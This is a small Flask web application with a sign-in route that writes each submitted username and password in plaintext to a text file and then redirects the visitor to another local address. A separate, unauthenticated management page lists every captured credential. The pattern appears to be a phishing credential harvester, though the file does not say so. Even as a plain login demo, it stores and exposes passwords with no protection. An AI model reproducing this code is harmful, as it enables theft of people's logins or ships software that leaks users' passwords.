from flask import Flask, render_template, request, url_for
import flask

app = Flask(__name__)

@app.route("/")
def main():
    return render_template("home.html")

@app.route("/signIn", methods=["POST"])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    userInformation = {
    }

    userInformation[username] = password

    for username in userInformation:
        with open("userNameAndPassword.txt", 'a') as file:
            file.write(f'{username},{password}\n')
        return flask.redirect('http://127.0.0.1:8080', code=302)
    else:
        return flask.redirect(url_for('main'))

@app.route("/management")
def managementPage():
    file_path = 'userNameAndPassword.txt'
    user_dict = {}

    with open(file_path, 'r') as file:
        for line in file:
            userInfo = line.strip().split(',')
            if len(userInfo) == 2:  # Check if both username and password are present
                username, password = userInfo
                user_dict[username] = password
    
    return render_template("management.html", user_dict=user_dict)



if __name__ == "__main__":
    app.run(debug=True)

